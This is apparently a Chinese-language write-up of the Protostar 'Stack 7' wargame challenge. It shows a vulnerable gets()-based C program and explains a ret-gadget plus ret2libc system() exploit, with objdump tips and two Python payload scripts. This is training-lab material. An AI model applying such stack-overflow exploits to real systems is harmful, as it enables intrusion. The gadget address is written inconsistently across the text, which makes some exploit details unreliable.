# Stack 7

## （一） 题目：

```
   \#include &lt;stdlib.h&gt;
```

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

char \*getpath\(\)

{

char buffer\[64\];

unsigned int ret;

printf\("input path please: "\); fflush\(stdout\);

gets\(buffer\);

ret = \_\_builtin\_return\_address\(0\);

if\(\(ret & 0xb0000000\) == 0xb0000000\) {

```
  printf\("bzzzt \(%p\)\n", ret\);

  \_exit\(1\);
```

}

printf\("got path %s\n", buffer\);

return strdup\(buffer\);

}

int main\(int argc, char \*\*argv\)

{

getpath\(\);

}

## （二）解题过程：

如图：![](/png/41.png)

思路：

1） 参照stack5 stack6的方法处理 栈溢出

2）调试coredump的方法

不同于stack6，本题限制返回地址不可以是库函数，比如不可是system\(\).这个限制仅仅限制在第一次返回时候，所以意味着，可以利用ROP方法，用一个gadget,后面可以正常跟shellcode. 使用了过滤， 所以不能使用堆栈以及环境变量以及libc库的地址来覆盖返回地址。

![](/png/42.png)

**objdump命令是Linux下的反汇编目标文件或者可执行文件的命令，它还有其他作用，下面以ELF格式可执行文件test为例详细介绍：**

objdump -f test  显示test的文件头信息

objdump -d test  反汇编test中的需要执行指令的那些section

objdump -D test  与-d类似，但反汇编test中的所有section

objdump -h test  显示test的Section Header信息

objdump -x test  显示test的全部Header信息

objdump -s test  除了显示test的全部Header信息，还显示他们对应的十六进制文件代码

输出到txt文件objdump -s test.so&gt;test.txt

同时可以用命nm,strace,gdb.

构造payload:

nop nop + ret + system\(\) +参数

8048617:    c3                       ret

![](/png/43.png)

76个nop+ ret地址+ system地址+ 环境变量地址 （修改应该是80个nop\)

设置环境变量export TTE="whoami"

再利用通用的地址获取代码getaddress.c

![](/png/44.png)

现在所有的要素都有了。

\x90 \*80 + 0x8040617 +0xb7ecffb0 + 0xbfffff47

漏洞利用代码编写如下：

exploit.py

\#!/usr/bin/env python

offset = 76    \(这里不对，应该是80个）

nopsled = "\x90"\*offset

ret = "\x17\x06\x04\x08"

system = "\xb0\xff\xec\xb7"

argv\_addr = "\x47\xff\xff\xbf"

print nopsled + "FAKE" +  ret + system + "FAKE" + argv\_addr

执行后，会出现段错误。后来才发现出错原因是填充字节应该是/80个，少了个字节。80个字节才能正好把ebp覆盖了，后面跟ret地址。

修改代码如下：

\#!/usr/bin/env python

offset = 0x50

cmd = "whoami"

junk = "J" \* \(offset - len\(cmd\)\)

gadg\_ret = "\x17\x86\x04\x08"

ret1= "\xb0\xff\xec\xb7"

ret2 = "\xc0\x60\xec\xb7"

arg1 = "\x46\xff\xff\xbf"

payload = cmd + junk + gadg\_ret + ret1 + ret2 + arg1

print payload

~

![](/png/45.png)



![](/png/46.png)

